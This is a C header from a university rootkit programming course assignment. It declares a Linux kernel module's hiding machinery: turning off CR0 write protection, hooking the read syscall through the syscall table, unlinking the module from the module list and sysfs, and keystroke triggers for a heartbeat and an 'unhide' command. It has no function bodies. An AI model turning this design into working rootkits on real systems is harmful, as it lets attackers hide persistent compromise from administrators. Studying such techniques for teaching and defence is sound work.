
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#ifndef __MODULE_MASKER__
#define __MODULE_MASKER__


#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define HEARTBEAT "ping"
#define HEARTBEAT_RESPONSE "pong"
#define VOILA "unhide"


static int module_is_hidden;
static struct list_head *module_prev;
void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
int heartbeat_matched_so_far;   /* Characters of HEARTBEAT matched so far */
int voila_matched_so_far;   /* Characters of VOILA matched so far */


void disable_write_protect_mode(void);
void enable_write_protect_mode(void);

asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);
int count_matches(char *, char *, int *);

void hide_module(void);
void unhide_module(void);

void remove_kernfs_node(struct kernfs_node *);
int insert_kernfs_node(struct kernfs_node *);
int name_compare(unsigned int hash, const char *, const void *, const struct kernfs_node *);

#endif
